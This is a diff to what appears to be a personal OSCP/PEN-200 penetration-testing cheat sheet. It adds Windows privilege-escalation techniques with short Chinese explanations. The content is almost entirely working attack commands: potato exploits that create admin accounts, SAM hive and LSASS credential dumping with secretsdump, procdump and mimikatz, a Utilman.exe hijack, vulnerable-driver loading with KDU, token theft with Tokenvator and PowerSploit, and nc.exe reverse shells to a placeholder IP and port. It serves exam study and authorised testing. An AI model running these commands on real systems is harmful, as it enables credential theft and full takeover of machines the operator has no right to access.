@@ -3,8 +3,8 @@ title: '[OSCP, PEN-200] Cheat Sheet'
 disqus: hackmd
 ---
 
-[OSCP, PEN-200] Cheat Sheet
-===
+# Table of Contents
+[TOC]
 
 # Recon
 ## IP
@@ -537,6 +537,7 @@ uid=1001(tom) gid=1001(tom) groups=1001(tom)
 
 ### whoami /priv
 - SeImpersonatePrivilege: PrintSpoofer
+冒充高權限 client token
     - [SigmaPotato](https://hackmd.io/@CHW/H1F8rLl5kg#SigmaPotato):`/home/chw/Desktop/upload_tools/SigmaPotato.exe`
         - `.\SigmaPotato "net user chw chw /add"`
         - `.\SigmaPotato "net localgroup Administrators chw /add"`
@@ -555,15 +556,60 @@ uid=1001(tom) gid=1001(tom) groups=1001(tom)
         - `.\Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\Public\nc.exe -e cmd.exe {IP} {Port}" -t * -c {{CLID}}`
 
 - SeBackupPrivilege: Shadow Copy
+可繞過 NTFS ACL，讀取 SAM/SECURITY/SYSTEM registry hive
     - 查看 `C:\Windows\System32\config\SYSTEM`
     - `reg save HKLM\SYSTEM system`
     - `reg save HKLM\SAM sam`
     - (Kali) `impacket-secretsdump  -system system -sam sam LOCAL`
 
 - SeRestorePrivilege: Utilman.exe Hijack
+繞過 ACL 覆寫 Windows 系統檔案
     - ` mv C:/Windows/System32/Utilman.exe C:/Windows/System32/Utilman.old `
     - `mv C:/Windows/System32/cmd.exe C:/Windows/System32/Utilman.exe`
     - Restart or logout ex.`RDP` 
+
+- SeDebugPrivilege: Dump LSASS
+可 attach 到 SYSTEM 等級的行程
+    - [Procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump?utm_source=chatgpt.com):`/home/chw/Desktop/upload_tools/Procdump/`
+        - `procdump.exe -ma lsass.exe lsass.dmp`
+    - Mimikatz
+        - `sekurlsa::logonpasswords`
+
+- SeTakeOwnershipPrivilege
+奪取檔案或服務的所有權，再修改 ACL → 寫入惡意檔
+    - `takeown /f C:\Windows\System32\utilman.exe`(`cmd.exe`): 獲取 utilman 所有權
+    - `icacls C:\Windows\System32\utilman.exe /grant chw:F`: 修改檔案 ACL，把帳號 chw 加入
+    
+- SeLoadDriverPrivilege
+載入惡意驅動，能直接修改記憶體，注入 SYSTEM shell
+    - [KDU](https://github.com/hfiref0x/KDU), [TDL](https://github.com/hfiref0x/TDL)
+        - `kdu.exe -map 0 drv\rtcore64.sys`
+        - `whoami`
+        - `kdu.exe -drvl -pshell`
+
+- SeCreateSymbolicLinkPrivilege
+建立 symlink 讓高權服務將檔案寫入控制的位置
+    - [CreateSymlink.exe](https://github.com/googleprojectzero/symboliclink-testing-tools): `/home/chw/Desktop/upload_tools/CreateSymlink.exe`
+        - `CreateSymlink.exe C:\Temp\log.txt C:\Windows\System32\services.exe`
+        - `echo @echo off > C:\Users\chw\Desktop\evil.bat`
+        - `echo C:\users\chw\desktop\nc.exe -e cmd.exe {IP} {Port} >> C:\Users\chw\Desktop\evil.bat`
+        
+- SeDelegateSessionUserImpersonatePrivilege
+類似 SeImpersonate，但限制在同一個 logon session (要有高權限使用者在同一個 session)
+    - DSUI: [Tokenvator](https://github.com/0xbadjuju/Tokenvator) `/home/chw/Desktop/upload_tools/Tokenvator.exe`
+        - `whoami /priv | findstr /i delegate` `query user`: 所在的 SESSIONNAME/ID
+        - `gps -IncludeUserName | ? {$_.SessionId -eq (Get-Process -Id $PID).SessionId} |
+  sort -desc WS | select -first 30 Name,Id,UserName,SessionId | ft -auto`\ 
+  找一個 UserName 為 `.\Administrator/DOMAIN\Admin` 或 `NT AUTHORITY\SYSTEM` 的 PID
+      - `Tokenvator.exe list`
+      - `Tokenvator.exe steal_token -p <PID> -c "C:\Windows\System32\cmd.exe"`
+      - [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) `/home/chw/Desktop/upload_tools/PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1`
+      - Windows
+        ```
+        Import-Module .\Invoke-TokenManipulation.ps1
+        Invoke-TokenManipulation -ImpersonateUser -ProcessId <PID>
+        Invoke-TokenManipulation -CreateProcess "C:\Windows\System32\cmd.exe"
+        ```
 
 ### PowerUp.ps1
 - `Get-ModifiableServiceFile`
